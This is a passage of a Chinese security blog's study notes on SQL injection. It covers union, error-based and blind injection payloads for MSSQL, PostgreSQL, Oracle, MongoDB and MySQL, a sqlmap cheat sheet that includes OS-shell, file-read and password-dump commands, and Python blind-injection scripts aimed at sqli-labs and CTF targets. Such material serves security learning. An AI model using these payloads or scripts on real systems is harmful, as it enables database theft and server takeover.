+<pre><code>?id=2 order by 数量
+</code></pre>
+<p>  (3)判断可显字段位</p>
+<pre><code>?id=-2 union all select null,null,null,null --+  
+</code></pre>
+<p>  (4)查询数据库名  </p>
+<pre><code>?id=-2 union all select null,&#39;1&#39;,(select db_name()),null --+  
+</code></pre>
+<p>  (5)查询表名  </p>
+<pre><code>?id=-2 union all select null,id,name,null from dbo.sysobjects where xtype=&#39;U&#39; --+
+</code></pre>
+<p>  (6)查询字段名  </p>
+<pre><code>?id=-2 union all select top 1 null,id,name,null from dbo.syscolumns where id=&#39;5575058&#39;--+  
+</code></pre>
+<p>  (7)获取数据  </p>
+<pre><code>?id=-2 union all select top 1 null,字段名,字段名,null from 数据库--+  
+</code></pre>
+<h3 id="postgresql注入"><a href="#postgresql注入" class="headerlink" title="postgresql注入"></a>postgresql注入</h3><pre><code>latex
+  1. 介绍：
+  postgresql简称PG，是一种特性非常齐全的自由软件的对象-关系型数据库管理系统。默认的端口是：5432，默认的用户名是： postgres ，默认的数据库也是：postgres 。
+  
+  2. 特有的查询关键字：
+  (1)current_catalog/current_database()与MySQL中的database()作用相同，为当前数据库名
+  (2)pg_database可查询所有的数据库（列名关键字为datname）
+  (3)user/current_user/getpgusername()都可用于查询当前用户名
+  (4)pg_stat_user_tables为当用户的表单所有信息，可用于查表名（列关键字为relname）
+  (5)current_schema[()]表示当前模式名
+  (6)pg_tables 是一个系统表，提供对数据库中每个表的信息的访问，通过对schemaname模式的限制得到表名
+  (7)MySQL中的limit 0,1在postgresql只能以limit 1 offset 0格式存在
+  
+  3. postgresql报错注入:
+  postgresql的报错注入原理与MSSQL的相同利用强类型语言数据库特性，当类型不一致时将会报错带出敏感数据达到注入的目的。具体用到的函数与MSSQL相同，cast()或者convert()这种强制转换的函数在与一个数比较达到报错目的。（前提是目标网站开启了报错提示）。
+  (1)查询数据库
+  1 AND 1=CAST((SELECT current_database())::text AS NUMERIC)
+  (2)查询数据表
+  1 AND 1=CAST((SELECT relname from pg_stat_user_tables limit 1 offset 0)::text AS NUMERIC)
+  (3)查询字段
+  1 AND 1=CAST((select column_name from information_schema.columns where table_name=&#39;test&#39; limit 1 offset 0)::text AS NUMERIC)
+  (4)查询数据
+  1 and 1=cast((select name||&#39;::&#39;||password from test.users limit 1 offset 0) as numeric)
+  注意：
+  CAST()：强制转换，在这里主要格式为CAST(&#39;string&#39; as NUMERIC)，即将字符串转换为数字型。
+  1::text  :   这个和上面恰好相反，它的意思是将一个数字型转换为text文本类型  
+</code></pre>
+<h3 id="oracle注入"><a href="#oracle注入" class="headerlink" title="oracle注入"></a>oracle注入</h3><pre><code>latex
+1. 介绍：
+Oracle数据库系统，是美国甲骨文公司开发的一款以分布式数据库为核心的数据库产品，也是目前最流行的数据库系统之一。作为一个关系型数据库系统，Oracle采用并行服务器模式，它能够实现分布式处理、具备完整的数据管理功能。
+
+2. 特有的表：
+(1)dual：是一个虚拟的表，用来构成select的语法规则，oracle保证dual里面永远只有一条记录。
+(2)user_tables：该表的table_name列存放着当前数据库的所有表。
+(3)user_tab_columns：该表的column_name 存放着表的所有列。
+
+3. oracle注入基本流程
+(1)判断字段数
+1&#39; order by 2 
+(2)查询数据库
+1&#39; union select 1,2 from dual
+(3)查询数据表
+1&#39; union select 1,(select table_name from user_tables where rownum=1) from dual
+(4)查询字段名
+1&#39; union select 1,(select column_name from user_tab_columns where rownum=1 and table_name=&#39;表名（大写的）&#39;) from dual
+(5)查询数据
+1&#39; union select 1,字段1||字段2...||字段n from 表名 where rownum=1  
+</code></pre>
+<h3 id="mangoDB注入"><a href="#mangoDB注入" class="headerlink" title="mangoDB注入"></a>mangoDB注入</h3><pre><code>latex
+1. 介绍：
+(1)MongoDB
+MongoDB 是当前最流行的 NoSQL 数据库产品之一，由 C++ 语言编写，是一个基于分布式文件存储的数据库。旨在为 WEB 应用提供可扩展的高性能数据存储解决方案。
+(2)Nosql
+NoSQL 即 Not Only SQL，意即 “不仅仅是SQL”。NoSQL 是一项全新的数据库革命性运动，早期就有人提出，发展至 2009 年趋势越发高涨。NoSQL的拥护者们提倡运用非关系型的数据存储，相对于铺天盖地的关系型数据库运用，这一概念无疑是一种全新的思维的注入。
+
+2. 数据存储方式：
+MongoDB 将数据存储为一个文档，数据结构由键值（key=&gt;value）对组成。MongoDB 文档类似于 JSON 对象。字段值可以包含其他文档，数组及文档数组。
+
+例如：
+&#123;
+    &quot;_id&quot; : ObjectId(&quot;60fa854cf8aaaf4f21049148&quot;),
+    &quot;name&quot; : &quot;whoami&quot;,
+    &quot;description&quot; : &quot;the admin user&quot;,
+    &quot;age&quot; : 19,
+    &quot;status&quot; : &quot;A&quot;,
+    &quot;groups&quot; : [
+        &quot;admins&quot;,
+        &quot;users&quot;
+    ]
+&#125;
+
+3. mongoDB注入基本流程
+后端原始语句为：$query=&quot;var data = db.notice.findOne(&#123;&#39;id&#39;:&#39;$id&#39;&#125;);return data;&quot;;
+(1)判断可显示字段位
+1&#39;&#125;); return (&#123;title:1,content:&#39;2
+(2)查询数据库
+1&#39;&#125;); return (&#123;title:tojson(db),content:&#39;1
+(3)查询数据表
+1&#39;&#125;); return (&#123;title:tojson(db.getCollectionNames()),content:&#39;1
+注意：db.getCollectionNames()返回的是数组，需要用tojson转换为字符串。并且mongodb函数区分大小写
+(4)查询字段中的数据
+1&#39;&#125;); return (&#123;title:tojson(db.Authority_confidential.find()[0]),content:&#39;1
+注意： db.Authority_confidential是当前用的集合（表），find函数用于查询，0是第一条数据
+</code></pre>
+<h2 id="SQLMAP的使用方法"><a href="#SQLMAP的使用方法" class="headerlink" title="SQLMAP的使用方法"></a>SQLMAP的使用方法</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/29196957/1670945742190-055db46a-01d9-429c-9409-e1e39c7f057a.png" alt="sqlmap使用方法.png">  </p>
+<pre><code>latex
+-u  #注入点 
+-f  #指纹判别数据库类型 
+-b  #获取数据库版本信息 
+-p  #指定可测试的参数(?page=1&amp;id=2 -p &quot;page,id&quot;) 
+-D &quot;&quot;  #指定数据库名 
+-T &quot;&quot;  #指定表名 
+-C &quot;&quot;  #指定字段 
+-s &quot;&quot;  #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s &quot;xx.log&quot;　　恢复:-s &quot;xx.log&quot; --resume) 
+--level=(1-5) #要执行的测试水平等级，默认为1 
+--risk=(0-3)  #测试执行的风险等级，默认为1 
+--time-sec=(2,5) #延迟响应，默认为5 
+--data #通过POST发送数据 
+--columns        #列出字段 
+--current-user   #获取当前用户名称 
+--current-db     #获取当前数据库名称 
+--users          #列数据库所有用户 
+--passwords      #数据库用户所有密码 
+--privileges     #查看用户权限(--privileges -U root) 
+-U               #指定数据库用户 
+--dbs            #列出所有数据库 
+--tables -D &quot;&quot;   #列出指定数据库中的表 
+--columns -T &quot;user&quot; -D &quot;mysql&quot;#列出mysql数据库中的user表的所有字段
+--dump-all            #列出所有数据库所有表 
+--exclude-sysdbs      #只列出用户自己新建的数据库和表 
+--dump -T &quot;&quot; -D &quot;&quot; -C &quot;&quot;   #列出指定数据库的表的字段的数据(--dump -T users -D master -C surname) 
+--dump -T &quot;&quot; -D &quot;&quot; --start 2 --top 4  # 列出指定数据库的表的2-4字段的数据 
+--dbms    #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB) 
+--os      #指定系统(Linux,Windows) 
+-v  #详细的等级(0-6)     0：只显示Python的回溯，错误和关键消息。 
+    1：显示信息和警告消息。 
+    2：显示调试消息。 
+    3：有效载荷注入。 
+    4：显示HTTP请求。 
+    5：显示HTTP响应头。 
+    6：显示HTTP响应页面的内容 
+--privileges  #查看权限 
+--is-dba      #是否是数据库管理员 
+--roles       #枚举数据库用户角色 
+--udf-inject  #导入用户自定义函数（获取系统权限） 
+--union-check  #是否支持union 注入 
+--union-cols #union 查询表记录 
+--union-test #union 语句测试 
+--union-use  #采用union 注入 
+--union-tech orderby #union配合order by 
+--data &quot;&quot; #POST方式提交数据(--data &quot;page=1&amp;id=2&quot;) 
+--cookie &quot;用;号分开&quot;      #cookie注入(--cookies=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low”) --referer &quot;&quot;     #使用referer欺骗(--referer &quot;http://&quot;) 
+--user-agent &quot;&quot;  #自定义user-agent 
+--proxy &quot;http://127.0.0.1:8118&quot; #代理注入 
+--string=&quot;&quot;    #指定关键词,字符串匹配. 
+--threads 　　  #采用多线程(--threads 3) 
+--sql-shell    #执行指定sql命令 
+--sql-query    #执行指定的sql语句(--sql-query &quot;SELECT password FROM mysql.user WHERE user = &#39;root&#39; LIMIT 0, 1&quot; ) 
+--file-read    #读取指定文件 
+--file-write   #写入本地文件(--file-write /test/test.txt --file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt) 
+--file-dest    #要写入的文件绝对路径 
+--os-cmd=id    #执行系统命令 
+--os-shell     #系统交互shell 
+--os-pwn       #反弹shell(--os-pwn --msf-path=/opt/framework/msf3/) 
+--msf-path=    #matesploit绝对路径(--msf-path=/opt/framework/msf3/) 
+--os-smbrelay  # 
+--os-bof       # 
+--reg-read     #读取win系统注册表 
+--priv-esc     # 
+--time-sec=    #延迟设置 默认--time-sec=5 为5秒 -p &quot;user-agent&quot; --user-agent &quot;sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)&quot;  #指定user-agent注入 
+--eta          #盲注 /pentest/database/sqlmap/txt/common-columns.txt　　字段字典　　　 
+common-outputs.txt 
+common-tables.txt      表字典 
+keywords.txt 
+oracle-default-passwords.txt 
+user-agents.txt 
+wordlist.txt 
+常用语句 :
+1./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db --users --passwords --dbs -v 0 
+2./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --passwords -U root --union-use -v 2 
+3./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -T users -C username -D userdb --start 2 --stop 3 -v 2 
+4./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -C &quot;user,pass&quot;  -v 1 --exclude-sysdbs 
+5./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --sql-shell -v 2 
+6./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-read &quot;c:\boot.ini&quot; -v 2 
+7./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-write /test/test.txt --file-dest /var/www/html/1.txt -v 2 
+8./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-cmd &quot;id&quot; -v 1 
+9./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-shell --union-use -v 2 
+10./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 --priv-esc -v 1 
+11./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 -v 1 
+12./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-bof --msf-path=/opt/framework/msf3 -v 1 
+13./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --reg-add --reg-key=&quot;HKEY_LOCAL_NACHINE\SOFEWARE\sqlmap&quot; --reg-value=Test --reg-type=REG_SZ --reg-data=1 
+14./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --eta 
+15./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&quot; -p id --prefix &quot;&#39;)&quot; --suffix &quot;AND (&#39;abc&#39;=&#39;abc&quot;16./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1&quot; --auth-type Basic --auth-cred &quot;testuser:testpass&quot;17./sqlmap.py -l burp.log --scope=&quot;(www)?\.target\.(com|net|org)&quot;18./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_int.php?id=1&quot; --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3 
+19./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mssql/get_int.php?id=1&quot; --sql-query &quot;SELECT &#39;foo&#39;&quot; -v 1 
+20./sqlmap.py -u &quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot; --common-tables -D testdb --banner 
+21./sqlmap.py -u &quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot; --cookie=&quot;PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low&quot; --string=&#39;xx&#39; --dbs --level=3 -p &quot;uid&quot;简单的注入流程 :
+1.读取数据库版本，当前用户，当前数据库 
+sqlmap -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db -v 1 
+2.判断当前数据库用户权限 
+sqlmap -u http://www.xxxxx.com/test.php?p=2 --privileges -U 用户名 -v 1 
+sqlmap -u http://www.xxxxx.com/test.php?p=2 --is-dba -U 用户名 -v 1 
+3.读取所有数据库用户或指定数据库用户的密码 
+sqlmap -u http://www.xxxxx.com/test.php?p=2 --users --passwords -v 2 
+sqlmap -u http://www.xxxxx.com/test.php?p=2 --passwords -U root -v 2 
+4.获取所有数据库 
+sqlmap -u http://www.xxxxx.com/test.php?p=2 --dbs -v 2 
+5.获取指定数据库中的所有表 
+sqlmap -u http://www.xxxxx.com/test.php?p=2 --tables -D mysql -v 2 
+6.获取指定数据库名中指定表的字段 
+sqlmap -u http://www.xxxxx.com/test.php?p=2 --columns -D mysql -T users -v 2 
+7.获取指定数据库名中指定表中指定字段的数据 
+sqlmap -u http://www.xxxxx.com/test.php?p=2 --dump -D mysql -T users -C &quot;username,password&quot; -s &quot;sqlnmapdb.log&quot; -v 2 
+8.file-read读取web文件 
+sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-read &quot;/etc/passwd&quot; -v 2 
+9.file-write写入文件到web 
+sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-write /localhost/mm.php --file使用sqlmap绕过防火墙进行注入测试：  
+</code></pre>
+<h2 id="查询方式及报错盲注"><a href="#查询方式及报错盲注" class="headerlink" title="查询方式及报错盲注"></a>查询方式及报错盲注</h2><h3 id="常见查询方式"><a href="#常见查询方式" class="headerlink" title="常见查询方式"></a>常见查询方式</h3><h4 id="select-查询数据"><a href="#select-查询数据" class="headerlink" title="select 查询数据"></a>select 查询数据</h4><p>在网站应用中进行数据显示查询操作  </p>
+<pre><code>mysql
+select * from news where id=$id  
+</code></pre>
+<h4 id="insert-插入数据"><a href="#insert-插入数据" class="headerlink" title="insert 插入数据"></a>insert 插入数据</h4><p>在网站应用中进行用户注册添加等操作  </p>
+<pre><code>sql
+insert into news(id,url,text) values(2,‘x’,’$t’)  
+</code></pre>
+<h4 id="delete-删除数据"><a href="#delete-删除数据" class="headerlink" title="delete 删除数据"></a>delete 删除数据</h4><p>后台管理里面删除文章删除用户等操作</p>
+<pre><code>sql
+delete from news where id=$id  
+</code></pre>
+<h4 id="update-更新数据"><a href="#update-更新数据" class="headerlink" title="update 更新数据"></a>update 更新数据</h4><p>会员或后台中心数据同步或缓存等操作  </p>
+<pre><code>sql
+update user set pwd=&#39;$p&#39; where id=2 and username=&#39;admin&#39;  
+</code></pre>
+<h4 id="order-by-排序数据"><a href="#order-by-排序数据" class="headerlink" title="order by 排序数据"></a>order by 排序数据</h4><p>一般结合表名或列名进行数据排序操作  </p>
+<pre><code>sql
+select * from news order by $id
+
+select id,name,price from news order by $order  
+</code></pre>
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><h4 id="Xpath语法错误"><a href="#Xpath语法错误" class="headerlink" title="Xpath语法错误"></a>Xpath语法错误</h4><p>从mysql5.1.5开始提供两个XML查询和修改的函数，<code>extractvalue</code>和<code>updatexml</code>。<code>extractvalue</code>负责在xml文档中按照<code>xpath</code>语法查询节点内容，<code>updatexml</code>则负责修改查询到的内容</p>
+<h5 id="updatexml-函数"><a href="#updatexml-函数" class="headerlink" title="updatexml()函数"></a>updatexml()函数</h5><ol>
+<li>updatexml（）是一个使用不同的xml标记匹配和替换xml块的函数。</li>
+<li>语法： updatexml（XML_document，XPath_string，new_value）</li>
+</ol>
+<blockquote>
+<p>第一个参数：是string格式，为XML文档对象的名称，文中为Doc<br>第二个参数：代表路径，Xpath格式的字符串例如&#x2F;&#x2F;title【@lang】<br>第三个参数：string格式，替换查找到的符合条件的数据</p>
+</blockquote>
+<ol start="3">
+<li>updatexml使用时，当<code>xpath_string</code>格式出现错误，mysql则会爆出<code>xpath语法错误</code>（xpath syntax）</li>
+</ol>
+<pre><code>sql
+select * from test where ide = 1 and (updatexml(1,0x7e,3)); 
+
+#由于0x7e是~，不属于xpath语法格式，因此报出xpath语法错误。  
+</code></pre>
+<h5 id="extractvalue-函数"><a href="#extractvalue-函数" class="headerlink" title="extractvalue()函数"></a>extractvalue()函数</h5><ol>
+<li>作用：此函数从目标XML中返回包含所查询值的字符串 </li>
+<li>语法：extractvalue（XML_document，xpath_string）</li>
+</ol>
+<blockquote>
+<p>第一个参数：string格式，为XML文档对象的名称<br>第二个参数：xpath_string（xpath格式的字符串</p>
+</blockquote>
+<ol start="3">
+<li>extractvalue使用时当<code>xpath_string</code>格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）</li>
+</ol>
+<pre><code>   select user,password from users where user_id=1 and (extractvalue(1,0x7e));
+   
+   #由于0x7e就是~不属于xpath语法格式，因此报出xpath语法错误。  
+</code></pre>
+<p>   例：</p>
+<ol>
+<li>爆数据库名：</li>
+</ol>
+<pre><code>username=1&#39; union select 1,(extractvalue(1,concat(0x7e,(select database())))) --+  
+</code></pre>
+<ol start="2">
+<li>爆数据库表名：</li>
+</ol>
+<pre><code>username=1&#39; union select 1,(extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;test&#39;)))) --+  
+</code></pre>
+<ol start="3">
+<li>爆字段名：</li>
+</ol>
+<pre><code>username=1&#39; union select 1,(extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;test&#39; and table_name=&#39;users&#39;))))--+   
+</code></pre>
+<ol start="4">
+<li>查数据</li>
+</ol>
+<pre><code> username=1&#39; union select 1,(extractvalue(1,concat(0x7e,(select group_concat(id,0x3a,username,0x3a,password) from security.users)))) --+  
+</code></pre>
+<h4 id="主键重复"><a href="#主键重复" class="headerlink" title="主键重复"></a>主键重复</h4><pre><code>latex
+   原理：利用select count(\*),floor(rand(0)*2)x from information_schema.character_sets group by x;导致数据库报错，通过concat函数连接注入语句与floor(rand(0)*2)函数，实现将注入结果与报错信息回显的注入方式。
+   
+   实际上只要是count，rand()，group by三个连用就会造成这种报错，与位置无关
+   
+   这种报错方法的本质是因为floor(rand(0)*2)的重复性，导致group by语句出错  
+</code></pre>
+<pre><code>例子：
+   
+   1. 爆数据库名
+   ?id=1 union select 1,count(*),concat(floor(rand(0)*2),0x7e,(database())) x from information_schema.schemata group by x
+   2. 爆数据表名
+   ?id=1 union select 1,count(*),concat(floor(rand(0)*2),0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;)) x from information_schema.schemata group by x
+   3. 爆字段名
+   ?id=1 union select 1,count(*),concat(floor(rand(0)*2),0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;)) x from information_schema.schemata group by x
+   4. 查数据
+   ?id=1 union select 1,count(*),concat(floor(rand(0)*2),0x7e,(select concat(password) from security.users limit 0,1)) x from information_schema.schemata group by x
+</code></pre>
+<p>例子：sqli-labs2</p>
+<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><h4 id="盲注的两个基本问题"><a href="#盲注的两个基本问题" class="headerlink" title="盲注的两个基本问题"></a>盲注的两个基本问题</h4><h5 id="字符串的截取"><a href="#字符串的截取" class="headerlink" title="字符串的截取"></a>字符串的截取</h5><pre><code>lateX
+   字符串截取函数：
+   1. substr(obj，start，length)
+       obj：从哪个内容中截取，可以是数值或字符串。
+       start：从哪个字符开始截取（1开始，而不是0开始）
+       length：截取几个字符（空格也算一个字符）
+   2. mid(str,pos,len)
+       str：我们要从中提取子字符串的字符串。
+       pos：它指示将在其中开始提取的输入字符串中的位置。
+       len：它指示我们要提取的字符串的长度。
+   3. right(str,len)
+       str:给定的字符串，将从其右侧提取许多字符。
+       len ：要提取的字符数。如果此参数大于字符串中的字符数，则此函数将返回实际的字符串。
+   4. left(str,length)
+       str：一个字符串
+       length：想要截取的长度，是一个正整数
+   5. regexp
+       用来判断一个字符串是否匹配一个正则表达式。这个函数兼容了截取与比较。
+   6. rlike
+       用来判断一个字符串是否匹配一个正则表达式。这个函数兼容了截取与比较。
+   7. trim([&#123;BOTH | LEADING | TRAILING&#125; [remstr] FROM str)
+       移除str这个字符串首尾（BOTH）/句首（LEADING）/句尾（TRAILING）的remstr
+   8. insert(str, pos, len, newstr)
+       str：我们要在其中插入另一个字符串的原始字符串。
+       pos：我们要插入另一个字符串的位置。
+       len：要替换的字符数。
+       newstr：要插入的字符串。  
+</code></pre>
+<h5 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h5><pre><code>lateX
+   比较方法：
+   1. = &gt; &lt;
+   2. LIKE
+       基本上可以用来替代等号，如果没有% _之类的字符的话
+   3. BETWEEN
+       用法：expr BETWEEN 下界 AND 上界;
+       说明：表示是否expr &gt;= 下界 &amp;&amp; exp &lt;= 上界
+   4. IN
+       用法：expr1 in (expr1, expr2, expr3)
+       说明：有点像数学中的元素是否属于一个集合
+   5. AND和减法运算
+   6. OR和减法运算
+   7. 异或
+   8. CASE  
+</code></pre>
+<h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>根据SQL语句查询的真和假，WEB程序有两种不同的回显，这两种不同的回显就被称为“布尔回显”<br>常用脚本  </p>
+<pre><code>python
+   import requests
+   import time
+   
+   url = &#39;http://127.0.0.1:4449/Less-5/?id=&#39;
+   content = &#39;&#39;
+   for pos in range(500):
+       # min_num是ascii码最小可显示符号 空格(space)
+       # max_num是ascii码最大可显示符号 波浪号(~)
+       min_num = 32
+       max_num = 126
+       mid_num = (min_num + max_num) // 2
+       while min_num &lt; max_num:
+           # 查找数据库：payload = &#39;1/*!*/and/*!*/if(ord(mid(database(),&#123;&#125;,1))&gt;&#123;&#125;,1,0)&#39;.format(pos, mid_num)
+           # 查找数据表：payload = &#39;1/*!*/and/*!*/if(ord(mid((select/*!*/group_concat(table_name)/*!*/from/*!*/information_schema.tables/*!*/where/*!*/table_schema=\&#39;wfy\&#39;),&#123;&#125;,1))&gt;&#123;&#125;,1,0)&#39;.format(pos, mid_num)
+           # 查找表中字段：payload = &#39;1/*!*/and/*!*/if(ord(mid((select/*!*/group_concat(column_name)/*!*/from/*!*/information_schema.columns/*!*/where/*!*/table_name=\&#39;wfy_comments\&#39;),&#123;&#125;,1))&gt;&#123;&#125;,1,0)&#39;.format(pos, mid_num)
+           # 查找数据：payload = &#39;1/*!*/and/*!*/if(ord(mid((select/*!*/group_concat(text)/*!*/from/*!*/wfy.wfy_comments),&#123;&#125;,1))&gt;&#123;&#125;,1,0)&#39;.format(pos, mid_num)
+   
+           # ord()：返回字符串str的最左面字符的ASCII代码值
+           # mid()：用于得到字符串的一部分
+           # if(expr1,expr2,expr3)：如果第一个语句正确就执行第二个语句，如果错误执行第三个语句
+           payload = &#39;1/*!*/and/*!*/if(ord(mid((select/*!*/group_concat(text)/*!*/from/*!*/wfy.wfy_comments),&#123;&#125;,1))&gt;&#123;&#125;,1,0)&#39;.format(pos, mid_num)
+           res_url = url + payload
+           print(res_url)
+           resp = requests.get(url=res_url)
+           time.sleep(0.5)
+   
+           if &#39;You are in&#39; in resp.text:
+               min_num = mid_num + 1
+           else:
+               max_num = mid_num
+   
+           mid_num = ((min_num + max_num) // 2)
+   
+       content += chr(min_num)
+       print(content)  
+</code></pre>
+<p>   例如：sqli-labs less8</p>
+<h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><p>   即在无法通过布尔盲注判断的情况下，通过响应时长来判断。</p>
+<p>   常用脚本  </p>
+<pre><code>python
+   import requests
+   import time
+    
+   s = requests.session()
+   url = &#39;http://5a4545bd-4a00-4978-81a5-a65922c249bb.node4.buuoj.cn:81/comments.php?name=&#39;
+   flag = &#39;&#39;
+   i = 0
+   while True:
+       i = i + 1
+       low = 32
+       high = 127
+       while low &lt; high:
+           mid = (low + high) // 2
+           # 查询数据库：payload = f&#39;1%0cand%0cif((ascii(substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;),1,sleep(3))&#39;
+           # 查询数据表：payload = f&#39;1%0cand%0cif(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(3))&#39;
+           # 查询表字段：payload = f&#39;1%0cand%0cif(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&quot;wfy_comments&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(3))&#39;
+           # 查询字段中信息：payload = f&#39;1%0cand%0cif(ascii(substr((select(text)from(wfy_comments)where(user=&quot;f1ag_is_here&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(3))&#39;
+           payload = f&#39;1%0cand%0cif(ascii(substr((select(text)from(wfy_comments)where(user=&quot;f1ag_is_here&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(3))&#39;
+           stime = time.time()
+           url1 = url + payload
+           r = s.get(url=url1)
+           r.encoding = &quot;utf-8&quot;
+           # print(payload)
+           if time.time() - stime &lt; 2:
+               low = mid + 1
+           else:
+               high = mid
+       if low != 32:
+           flag += chr(low)
+       else:
+           break
+       print(flag)         
+</code></pre>
+<p>例如：sqli-labs less9</p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 Lovy
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;Lovy
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+</body>
+</html>
